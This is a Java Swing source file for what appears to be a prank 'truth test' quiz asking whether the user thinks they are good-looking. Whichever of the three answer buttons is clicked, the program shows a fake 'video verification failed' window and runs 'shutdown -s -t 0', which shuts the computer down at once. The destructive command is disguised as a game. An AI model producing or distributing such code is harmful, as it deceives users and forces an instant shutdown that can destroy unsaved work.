package com.sensorsdata.spoof;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

public class GameJFrame extends JFrame implements ActionListener {
    /*
      JComponent的继承关系： java.jwt.Component->java.jwt.Container->java.swing.JComponent
      JComponent类几乎是所有Swing组件的公共超类。
      JComponent有以下子类：
      JButton   JCheckbox  JTextComponent

      JFrame的父类是java.awt.Frame
     */

    private JButton b1 = null;
    private  JButton b2 = null;
    private  JButton b3 = null;
    public GameJFrame() throws HeadlessException {

        initJFrame();
        initContent();
        this.setVisible(true);
    }

    private void initJFrame(){
        //初始化JFrame

        //设置界面宽高
        this.setSize(608,680);
        //设置标题
        this.setTitle("真心话测试");
        //设置展示在前台
        this.setAlwaysOnTop(true);
        //设置水平居中
        this.setLocationRelativeTo(null);
        //设置退出模式
        this.setDefaultCloseOperation(EXIT_ON_CLOSE);
        //设置布局,设置为null后，窗体中的组件可以采用绝对位置定位
        this.setLayout(null);
    }
    private void initContent(){
        //设置文本
        JLabel quesText = new JLabel("你觉得你长的好看吗？");
        quesText.setBounds(150,50,350,100);
        this.getContentPane().add(quesText);

        //设置按钮
        b1 = new JButton("非常的beatuiful");
        b1.setBounds(150,150,160,40);
        //添加监听事件
        b1.addActionListener(this);

        //设置按钮
        b2 = new JButton("有那么一点点好看");
        b2.setBounds(150,250,160,40);
        b2.addActionListener(this);

        //设置按钮
        b3 = new JButton("不好看");
        b3.setBounds(150,350,160,40);
        b3.addActionListener(this);

        this.getContentPane().add(b1);
        this.getContentPane().add(b2);
        this.getContentPane().add(b3);

    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Object obj = e.getSource();
        if(obj == b1){
            JFrame tip = new JFrame("视频验证中..");
            JLabel content = new JLabel("验证失败，马上关机");
            content.setBounds(200,200,200,100);
            tip.setSize(600,600);
            tip.getContentPane().add(content);
            tip.setAlwaysOnTop(true);
            tip.setLayout(null);
            tip.setDefaultCloseOperation(HIDE_ON_CLOSE);
            tip.setVisible(true);
            try {
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } catch (IOException ex) {
                ex.printStackTrace();
            }

        }else if(obj == b2){
            JFrame tip = new JFrame("视频验证中..");
            JLabel content = new JLabel("验证失败，马上关机");
            content.setBounds(200,200,200,100);
            tip.setSize(600,600);
            tip.getContentPane().add(content);
            tip.setAlwaysOnTop(true);
            tip.setLayout(null);
            tip.setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
            tip.setVisible(true);
            try {
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }else if(obj == b3){
            JFrame tip = new JFrame("视频验证中..");
            JLabel content = new JLabel("验证失败，马上关机");
            content.setBounds(200,200,200,100);
            tip.setSize(600,600);
            tip.getContentPane().add(content);
            tip.setAlwaysOnTop(true);
            tip.setLayout(null);
            tip.setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
            tip.setVisible(true);
            try {
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }

    }
}
